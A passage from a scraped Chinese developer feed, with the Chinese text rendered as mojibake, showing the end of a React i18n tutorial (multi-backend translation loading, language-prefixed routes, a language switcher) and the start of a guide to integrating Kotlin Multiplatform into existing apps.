      <span class="hljs-keyword">if</span> (pos &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'non of the backend loaded data;'</span>, <span class="hljs-literal">true</span>));
      }
      
      <span class="hljs-keyword">const</span> backend = <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[pos];
      <span class="hljs-keyword">if</span> (backend.<span class="hljs-property">read</span>) {
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolver</span> = (<span class="hljs-params">err, data</span>) =&gt; {
          <span class="hljs-keyword">if</span> (!err &amp;&amp; data &amp;&amp; <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(data).<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, data, pos);
            <span class="hljs-comment">// ä¿å­˜åˆ°å‰é¢çš„åç«¯ï¼ˆå¦‚æœ¬åœ°ç¼“å­˜ï¼‰</span>
            <span class="hljs-title function_">savePosition</span>(pos - <span class="hljs-number">1</span>, data);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å°è¯•ä¸‹ä¸€ä¸ªåç«¯</span>
            <span class="hljs-title function_">loadPosition</span>(pos + <span class="hljs-number">1</span>);
          }
        };
        
        <span class="hljs-comment">// å¤„ç† Promise æˆ–å›è°ƒ</span>
        <span class="hljs-keyword">const</span> result = backend.<span class="hljs-title function_">read</span>(language, <span class="hljs-keyword">namespace</span>);
        if (result &amp;&amp; typeof result.then === 'function') {
          result.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> <span class="hljs-title function_">resolver</span>(<span class="hljs-literal">null</span>, data)).<span class="hljs-title function_">catch</span>(resolver);
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-title function_">resolver</span>(<span class="hljs-literal">null</span>, result);
        }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">loadPosition</span>(pos + <span class="hljs-number">1</span>);
      }
    };

    <span class="hljs-title function_">loadPosition</span>(<span class="hljs-number">0</span>);
  }
}
</code></pre>
<p>ä¼˜åŠ¿ï¼šæ”¯æŒå¤šåç«¯ï¼Œå¯é…ç½®å¤šä¸ªåç«¯ï¼ŒæŒ‰é¡ºåºå°è¯•ï¼›ä¸€ä¸ªå¤±è´¥æ—¶è‡ªåŠ¨å°è¯•ä¸‹ä¸€ä¸ªï¼›åŒæ—¶æ”¯æŒå°†è¿œç¨‹èµ„æºä¿å­˜åˆ°æœ¬åœ°ç¼“å­˜</p>
<h3 data-id="heading-5">3. è·¯ç”±é›†æˆå¤šè¯­è¨€è·¯å¾„</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/App.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-router-dom"</span>;
<span class="hljs-keyword">import</span> { routesMap } <span class="hljs-keyword">from</span> <span class="hljs-string">"./pages/constants"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
      {/* é»˜è®¤è·¯ç”±ï¼ˆæ— è¯­è¨€å‰ç¼€ï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span>/&gt;</span>} /&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">{routesMap.example1}</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Example1</span> /&gt;</span>} /&gt; 
        {/* ... */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span>

      {/* å¤šè¯­è¨€è·¯ç”±ï¼ˆ/:lang/...ï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">{</span>`/<span class="hljs-attr">:lang</span>`} <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">{</span>`/<span class="hljs-attr">:lang</span>/${<span class="hljs-attr">routesMap.example1</span>}`} <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Example1</span> /&gt;</span>} /&gt; 
      {/* ... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-6">4. è¯­è¨€åˆ‡æ¢ç»„ä»¶</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/languageChange/index.tsx</span>
<span class="hljs-keyword">import</span> { useTranslation } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-i18next"</span>;
<span class="hljs-keyword">import</span> { useNavigate, useParams } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-router-dom"</span>;
<span class="hljs-keyword">import</span> { getLang, setLang } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils/storageData"</span>;
<span class="hljs-keyword">import</span> { routesMap } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/pages/constants"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LanguageChange</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>();
  <span class="hljs-keyword">const</span> [t, i18n] = <span class="hljs-title function_">useTranslation</span>(<span class="hljs-string">"example"</span>);
  <span class="hljs-keyword">const</span> { lang } = <span class="hljs-title function_">useParams</span>();
  
  <span class="hljs-keyword">const</span> langList = [
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"EN"</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">"en"</span> },
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"ä¸­æ–‡"</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">"zh-MY"</span> },
  ];

  <span class="hljs-comment">// åˆ‡æ¢è¯­è¨€å¹¶æ›´æ–° URL</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">urlLangChange</span> = (<span class="hljs-params">paramLang: <span class="hljs-built_in">any</span></span>) =&gt; {
    <span class="hljs-keyword">let</span> currentlang = paramLang;
    
    <span class="hljs-comment">// éªŒè¯è¯­è¨€æ˜¯å¦æœ‰æ•ˆ</span>
    <span class="hljs-keyword">if</span> (!paramLang || !langList.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">key</span>).<span class="hljs-title function_">includes</span>(paramLang)) {
      currentlang = <span class="hljs-title function_">getLang</span>() || <span class="hljs-string">"en"</span>;
    }
    
    <span class="hljs-comment">// æå–å½“å‰è·¯å¾„ï¼ˆå»é™¤è¯­è¨€å‰ç¼€ï¼‰</span>
    <span class="hljs-keyword">let</span> pathSegments = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">"/"</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"/"</span>);
    <span class="hljs-keyword">if</span> (
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"/zh-MY"</span>) ||
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"/en"</span>)
    ) {
      pathSegments = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">"/"</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"/"</span>);
    }

    <span class="hljs-comment">// éªŒè¯è·¯å¾„æ˜¯å¦åœ¨è·¯ç”±è¡¨ä¸­</span>
    <span class="hljs-keyword">let</span> currentPath = pathSegments;
    <span class="hljs-keyword">const</span> isPathNotInMap = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(routesMap).<span class="hljs-title function_">includes</span>(pathSegments);
    <span class="hljs-keyword">if</span> (!isPathNotInMap) {
      currentPath = <span class="hljs-string">""</span>;
    }
    
    <span class="hljs-comment">// æ›´æ–° URLï¼Œä¿æŒå½“å‰è·¯å¾„</span>
    <span class="hljs-title function_">navigate</span>(
      <span class="hljs-string">`/<span class="hljs-subst">${currentlang}</span><span class="hljs-subst">${currentPath &amp;&amp; <span class="hljs-string">`/<span class="hljs-subst">${currentPath}</span>`</span>}</span><span class="hljs-subst">${
        <span class="hljs-variable language_">window</span>.location.search &amp;&amp; <span class="hljs-variable language_">window</span>.location.search
      }</span>`</span>,
      { <span class="hljs-attr">replace</span>: <span class="hljs-literal">true</span> }
    );
    
    <span class="hljs-comment">// åˆ‡æ¢ i18n è¯­è¨€</span>
    <span class="hljs-title function_">handleLangChange</span>(currentlang);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLangChange</span> = (<span class="hljs-params">newLang: <span class="hljs-built_in">string</span></span>) =&gt; {
    i18n.<span class="hljs-title function_">changeLanguage</span>(newLang, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">document</span>?.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"html"</span>)?.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"lang"</span>, newLang);
    });
    <span class="hljs-title function_">setLang</span>(newLang); <span class="hljs-comment">// ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨</span>
  };

  <span class="hljs-comment">// åˆå§‹åŒ–æ—¶æ ¹æ® URL å‚æ•°è®¾ç½®è¯­è¨€</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">urlLangChange</span>(lang);
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"lang-icon"</span>&gt;</span>
      {langList.map((item) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">{item?.key</span> === <span class="hljs-string">getLang()</span> ? "<span class="hljs-attr">active</span>" <span class="hljs-attr">:</span> ""}
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> urlLangChange(item?.key)}
        &gt;
          {item?.name}
        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>è¦ç‚¹ï¼š</p>
<ul>
<li>URL åŒæ­¥ï¼šåˆ‡æ¢è¯­è¨€æ—¶æ›´æ–° URLï¼Œä¿æŒå½“å‰è·¯å¾„</li>
<li>è·¯å¾„éªŒè¯ï¼šç¡®ä¿è·¯å¾„åœ¨è·¯ç”±è¡¨ä¸­</li>
<li>æœ¬åœ°å­˜å‚¨ï¼šä¿å­˜ç”¨æˆ·è¯­è¨€åå¥½</li>
<li>HTML lang å±æ€§ï¼šåŒæ­¥æ›´æ–° <code>&lt;html lang&gt;</code></li>
</ul>
<h3 data-id="heading-7">5. æœ¬åœ°å­˜å‚¨ç®¡ç†</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/storageData.ts</span>
<span class="hljs-keyword">import</span> { storage } <span class="hljs-keyword">from</span> <span class="hljs-string">"@storage"</span>;<span class="hljs-comment">//è·å–æœ¬åœ°å­˜å‚¨çš„åŒ…ï¼Œéœ€åœ¨npmä¸Šæ‰¾æ›¿ä»£åŒ…</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LANG_KEY</span> = <span class="hljs-string">"LANG_KEY"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getLang</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> lang = storage.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">LANG_KEY</span>) || <span class="hljs-string">"en"</span>;
  <span class="hljs-keyword">return</span> lang;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setLang</span>(<span class="hljs-params">lang: <span class="hljs-built_in">string</span></span>) {
  storage.<span class="hljs-title function_">set</span>(<span class="hljs-variable constant_">LANG_KEY</span>, lang);
}
</code></pre>
<h3 data-id="heading-8">6. åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ç¿»è¯‘</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¤ºä¾‹ï¼šåœ¨ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> { useTranslation } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-i18next"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Banner</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [t] = <span class="hljs-title function_">useTranslation</span>();
  
  <span class="hljs-keyword">const</span> list = [
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">"one"</span>,
      <span class="hljs-attr">hint</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">"exclusiveEventDesc1"</span>),  <span class="hljs-comment">// ä½¿ç”¨ç¿»è¯‘</span>
      <span class="hljs-comment">// ...</span>
    },
  ];
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{t("pageTitle")}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {/* ... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-9">æŠ€æœ¯ä¼˜åŠ¿</h2>
<p>ä¸ä»…å®ç°äº†3ç§ç¯å¢ƒçš„éš”ç¦»ï¼Œåœ¨æ€§èƒ½ä¸Šï¼Œi18nçš„ç¿»è¯‘æ˜¯æŒ‰éœ€åŠ è½½çš„ï¼Œå‡å°‘åˆå§‹åŒ…ä½“ç§¯ï¼Œæ”¯æŒè¿è¡Œæ—¶æ›´æ–°ç¿»è¯‘èµ„æºï¼Œè€Œä¸”ç”¨æˆ·åˆ‡æ¢è¯­è¨€æ—¶ä¿æŒå½“å‰é¡µé¢</p>
<h2 data-id="heading-10">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-11">1. èµ„æºæ–‡ä»¶ç»„ç»‡</h3>
<pre><code class="hljs language-bash" lang="bash">
  â””â”€â”€ example/
      â”œâ”€â”€ en.json          <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒè‹±æ–‡</span>
      â”œâ”€â”€ zh-MY.json        <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒä¸­æ–‡</span>
      â”œâ”€â”€ testnet-en.json   <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒè‹±æ–‡</span>
      â””â”€â”€ testnet-zh-MY.json <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒä¸­æ–‡</span>
</code></pre>
<h3 data-id="heading-12">2. ç¿»è¯‘ Key å‘½åè§„èŒƒ</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"metaTitle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"example"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pageTitle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Welcome to example"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"chooseLanguage"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Choose Language"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-13">å®Œæ•´æµç¨‹å›¾</h2>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·è®¿é—®é¡µé¢
<span class="hljs-code">    â†“
è¯­è¨€æ£€æµ‹å™¨æ£€æµ‹è¯­è¨€ï¼ˆæµè§ˆå™¨/URL/æœ¬åœ°å­˜å‚¨ï¼‰
    â†“
æ ¹æ®ç¯å¢ƒåŠ è½½å¯¹åº”èµ„æºè·¯å¾„
    â†“
HTTP Backend è¯·æ±‚ç¿»è¯‘èµ„æº
    â†“
åŠ è½½æˆåŠŸ â†’ æ¸²æŸ“é¡µé¢
    â†“
ç”¨æˆ·åˆ‡æ¢è¯­è¨€
    â†“
æ›´æ–° i18n è¯­è¨€ + æ›´æ–° URL + ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨
    â†“
é‡æ–°åŠ è½½å¯¹åº”è¯­è¨€èµ„æº
    â†“
é¡µé¢æ›´æ–°
</span></code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3afdffbe3f854f25bea493d760bf5caa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFvbWlf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765773753&amp;x-signature=pkIhK9VJselnYOxhr4Rn1lu%2BWIU%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­˜é‡é¡¹ç›®å¦‚ä½•æ‹¥æŠ± KMPï¼Ÿä»ç¯å¢ƒæ­å»ºåˆ°ç»„ä»¶åŒ–é›†æˆçš„ä¿å§†çº§æŒ‡å—]]></title>    <link>https://juejin.cn/post/7580740782933426218</link>    <guid>https://juejin.cn/post/7580740782933426218</guid>    <pubDate>2025-12-08T05:38:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933426218" data-draft-id="7580616979473711110" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­˜é‡é¡¹ç›®å¦‚ä½•æ‹¥æŠ± KMPï¼Ÿä»ç¯å¢ƒæ­å»ºåˆ°ç»„ä»¶åŒ–é›†æˆçš„ä¿å§†çº§æŒ‡å—"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-08T05:38:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·4165967369355"/> <meta itemprop="url" content="https://juejin.cn/user/1146150492576877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­˜é‡é¡¹ç›®å¦‚ä½•æ‹¥æŠ± KMPï¼Ÿä»ç¯å¢ƒæ­å»ºåˆ°ç»„ä»¶åŒ–é›†æˆçš„ä¿å§†çº§æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146150492576877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·4165967369355
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:38:28.000Z" title="Mon Dec 08 2025 05:38:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æ‘˜è¦ï¼š</strong>  Kotlin Multiplatform (KMP) æ˜¯ç›®å‰æˆ‘ä»¬é€‰å®šçš„è·¨å¹³å°å¼€å‘æ–¹æ¡ˆï¼Œä½†æ‰‹å¤´æœ‰å‡ ç™¾ä¸‡è¡Œä»£ç çš„å­˜é‡é¡¹ç›®ï¼Œä¸å¯èƒ½æ¨å€’é‡æ¥ã€‚æœ¬æ–‡å°†é€šè¿‡â€œç»„ä»¶åŒ–é›†æˆâ€çš„æ€è·¯ï¼Œä»é›¶ç¯å¢ƒæ­å»ºï¼Œåˆ°å¤„ç†å¹³å°å·®å¼‚ï¼Œæœ€åè¾“å‡º AAR å’Œ XCFrameworkï¼Œå®ç° KMP åœ¨å¤§å‹é¡¹ç›®ä¸­çš„â€œå¢é‡â€è½åœ°ã€‚</p>
<hr/>
<h2 data-id="heading-0">å‰è¨€ï¼šä¸ºä»€ä¹ˆæ˜¯ç»„ä»¶åŒ–é›†æˆï¼Ÿ</h2>
<p>KMP çš„æœ€å¤§é­…åŠ›åœ¨äºå®ƒçš„<strong>éä¾µå…¥æ€§</strong>ã€‚åœ¨â€œBrownfieldï¼ˆæ£•åœ°/å­˜é‡ï¼‰â€å¼€å‘æ¨¡å¼ä¸‹ï¼ŒKMP å¯ä»¥ä»…ä»…ä½œä¸ºä¸€ä¸ª <strong>Moduleï¼ˆæ¨¡å—ï¼‰</strong> å­˜åœ¨ã€‚</p>
<ul>
<li><strong>å¯¹ Android æ¥è¯´ï¼š</strong> å®ƒå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ Kotlin Libraryï¼Œè¾“å‡º <code>.aar</code>ã€‚</li>
<li><strong>å¯¹ iOS æ¥è¯´ï¼š</strong> å®ƒå°±æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹ SDKï¼Œè¾“å‡º <code>.xcframework</code>ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼š<strong>ä¸éœ€è¦é‡å†™ APPï¼Œåªéœ€è¦æŠŠâ€œæ ¸å¿ƒç®—æ³•â€ã€â€œæ•°æ®å±‚â€æˆ–â€œæ–°ä¸šåŠ¡æ¨¡å—â€ç”¨ KMP å†™ä¸€éï¼Œç„¶ååˆ†å‘ç»™åŒç«¯ä½¿ç”¨ã€‚</strong></p>
<hr/>
<h2 data-id="heading-1">ç¬¬ä¸€éƒ¨åˆ†ï¼šä» 0 åˆ° 1 çš„ç¯å¢ƒå‡†å¤‡</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç å‰ï¼Œå¿…é¡»è·¨è¿‡ç¯å¢ƒé…ç½®è¿™é“åã€‚KMP æ¶‰åŠåŒç«¯ç”Ÿæ€ï¼Œé…ç½®ç¨æ˜¾å¤æ‚ã€‚</p>
<h3 data-id="heading-2">1. ç¡¬ä»¶ä¸è½¯ä»¶æ¸…å•</h3>
<ul>
<li>
<p><strong>æ“ä½œç³»ç»Ÿï¼š</strong> æ¨è macOSï¼ˆå¿…é¡»ç”¨äºç¼–è¯‘ iOS äº§ç‰©ï¼‰ã€‚å¦‚æœæ˜¯ Windowsï¼Œåªèƒ½ç¼–è¯‘ Android å’Œ JVM ç«¯ã€‚</p>
</li>
<li>
<p><strong>JDKï¼š</strong> å¼ºçƒˆæ¨è <strong>JDK 17</strong>ï¼Œå…¼å®¹æ€§æœ€ä½³ã€‚</p>
</li>
<li>
